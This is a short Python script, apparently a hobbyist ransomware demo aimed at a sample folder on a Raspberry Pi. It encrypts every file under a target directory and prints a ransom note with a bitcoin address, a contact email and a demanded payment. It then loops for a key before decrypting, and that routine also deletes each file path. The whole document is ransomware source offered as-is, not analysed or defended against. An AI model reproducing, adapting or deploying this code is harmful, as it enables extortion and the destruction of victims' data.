from loadkey import load_key
from enc import encrypt
from dec import decrypt
from scan import scanDirectoryForOnlyFiles
from keygen import write_key
import ascii_art
import ransomware_config as rconfig
import os

target = "/home/pi/Documents/ransomware/example_root"
key = load_key()
print(key)
def encAllFiles():
    for path in scanDirectoryForOnlyFiles(target):
        encrypt(path,key)
        print(path,"done")
    
encAllFiles()

print("="*100+"\n\n\n\n\n")
print("Your system has been attacked by ransom virus..")
print("all your files are encrypted using symmetric key algorithm.")
print("\n\n\n")
print(ascii_art.ascii_art)
print("\n\n\n")
print(rconfig.btc_address)
print(rconfig.email)
print(rconfig.custom_message)
print(f"if you want to get your files back you have to pay {rconfig.amount} usd worth of bitcoin.")


def decAllFiles():
     for path in scanDirectoryForOnlyFiles(target):
        decrypt(path,key)
        print(path,"done")
        os.remove(path)
    
    
def askForKey():
    purchased_key = ""
    while purchased_key != key:
        purchased_key = input("enter key:")
        purchased_key = purchased_key.encode("utf-8")
        if purchased_key == key:
            print("correct key!")
            
        else:
            print("wrong key try again!")
    
    decAllFiles()

    

askForKey()

    